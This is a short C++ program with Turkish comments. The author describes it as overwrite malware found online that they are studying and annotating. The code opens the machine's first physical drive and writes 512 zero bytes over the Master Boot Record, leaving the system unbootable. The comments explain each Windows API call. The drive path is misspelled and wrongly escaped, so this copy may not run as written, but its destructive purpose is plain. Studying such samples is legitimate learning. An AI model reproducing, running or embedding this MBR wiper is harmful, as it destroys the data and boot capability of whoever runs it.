/*
	İnternette bulduğum Overwrite Zararlı Yazılımını öğrenme ve yorumlama 
*/
#include <Windows.h>
#include <iostream>

using namespace std;

#define MBR_SIZE 512

int main()
{
	DWORD write;
	char mbrData[MBR_SIZE]; 
	ZeroMemory(&mbrData,(sizeof mbrData)); //Destination,Length //ZeroMemory belirtilen alanı belirtilen boyutta temizler
										  
    //Handle Windows nesneleri için bir çeşit işaretçidir
	//CreateFile dosya oluşturur yada var olan dosya üzerinde işlem yapar
	HANDLE MasterBootRecord = CreateFile("\\\\.\PyhsicalDriver0",//Dosyanın adı
		GENERIC_ALL,FILE_SHARE_READ|FILE_SHARE_WRITE,//Dosyanın açılma izinlerinin hepsi verildi ve Dosyanın paylaşım modları read ve write
		NULL,OPEN_EXISTING,NULL,NULL); //Dosyanın durumu
	
	//WriteFile: Verileri belirtilen dosya veya giriş / çıkış(G / Ç) aygıta yazar.
	//Parametreler:dosya adı,verileri içeren ara bellek,boyut,yazılan bayt numarasını alır,çakışma durumu
	if (WriteFile(MasterBootRecord, mbrData, 512, &write, NULL) == TRUE)
	{
		cout << "Master Boot Record is over written !" << endl;
		Sleep(5000);
		ExitProcess(0);
	}
	else
	{
		cout << "Fail " ;
		Sleep(5000);
		ExitProcess(0);
	}
	CloseHandle(MasterBootRecord);

	return EXIT_SUCCESS;

}

